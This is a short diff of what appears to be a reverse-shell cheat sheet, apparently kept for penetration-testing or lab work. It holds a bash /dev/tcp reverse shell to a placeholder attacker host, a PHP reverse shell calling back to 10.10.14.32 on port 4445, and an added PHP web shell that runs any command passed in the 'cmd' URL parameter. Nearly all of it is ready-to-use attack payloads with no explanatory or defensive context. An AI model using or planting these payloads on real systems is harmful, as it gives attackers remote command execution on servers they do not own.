@@ -27,10 +27,12 @@
     0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196
 
 # Php reverse shell
-<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.32/4445 0>&1'"); ?>
+    
+    <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.32/4445 0>&1'"); ?>
 
 # Php cmd shell
-
+    
+    <?php echo "Shell";system($_GET['cmd']); ?>
 
 
 # Python
